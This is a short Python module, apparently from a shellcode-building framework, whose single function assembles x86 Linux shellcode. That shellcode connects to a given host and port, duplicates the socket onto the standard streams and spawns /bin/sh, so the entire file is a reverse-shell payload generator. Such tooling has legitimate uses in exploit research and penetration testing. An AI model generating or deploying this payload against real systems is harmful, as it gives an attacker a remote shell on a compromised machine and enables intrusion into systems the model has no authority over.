from core import *

def main(host, port):
    """Args: host, port
    Connects to <host> on <port>, spawns /bin/sh and binds it to the socket."""
    try:
        host = ip(host)
    except:
        print 'Could not resolve host'
        exit(0)
    try:
        port = int(port)
    except:
        print 'Port must be an integer (base 10)'
        exit(0)
    return \
        template('linux/connect.asm', {'host': host, 'port': htons(port)}) + \
        asm('xchg esi, eax') + \
        template('linux/dup.asm') + \
        template('linux/sh.asm')
